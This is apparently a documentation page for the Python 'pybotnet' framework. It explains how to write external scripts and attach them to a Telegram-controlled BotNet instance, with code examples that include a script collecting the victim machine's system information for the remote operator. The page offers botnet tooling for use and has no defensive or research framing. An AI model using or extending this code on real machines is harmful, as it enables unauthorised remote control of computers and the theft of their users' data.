

You can write a series of scripts outside the main file and add it to your botnet by `import_external_scripts`

lets see some example:

```py title="external_scripts.py"

from pybotnet import ExternalScripts, Context # (1)


external_botnet = ExternalScripts() # (2)

@external_botnet.add_script() # (3)
def hello_world():
    """return hello_world"""
    return "hello_world"


@external_botnet.add_script(script_name='sys_data', script_version="0.1.0") # (4)
def get_system_info(context: Context):
    """return system_info"""
    sys_data = ""
    for key, value in context.system_info().items():
        sys_data += f"{key}: {value}\n"
    return sys_data

```

1. import `ExternalScripts` from pybotnet
2. create `ExternalScripts` instance
3. add some simple script
4. create other script..

in code above we create a instance of `ExternalScripts` (this a `botNet` child) and add our scripts..

```py title="main.py"

from pybotnet import BotNet, Context, TelegramEngine
from external_scripts import external_botnet # (1)

telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID)

botnet = BotNet(telegram_engine)



botnet.import_external_scripts(external_botnet) # (2)

botnet.run() # (3) 
```

1. import `external_botnet` from `external_scripts.py`
2. add external scripts to our `botnet` instance
3. or you can use botnet.run_background(), botnet.stop_background()


import `external_botnet` from `external_script` and add external scripts to `botnet` by call `botnet.import_external_scripts(external_botnet)`